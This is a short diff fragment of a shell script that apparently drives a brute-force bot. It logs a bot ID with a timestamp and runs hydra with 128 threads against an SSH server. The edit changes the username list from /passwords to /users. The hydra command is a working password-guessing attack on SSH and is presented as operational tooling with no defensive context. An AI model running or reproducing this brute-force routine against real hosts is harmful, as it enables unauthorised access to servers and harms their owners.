@@ -18,4 +18,4 @@ echo "[STARTING BOT-ID: $name $(date +%D-%T) ]" | tee -a $log_file
 
 sleep 1
 
-hydra -L /passwords -V -P /passwords -t 128 $server ssh | tee -a $name.log 
+hydra -L /users -V -P /passwords -t 128 $server ssh | tee -a $name.log 
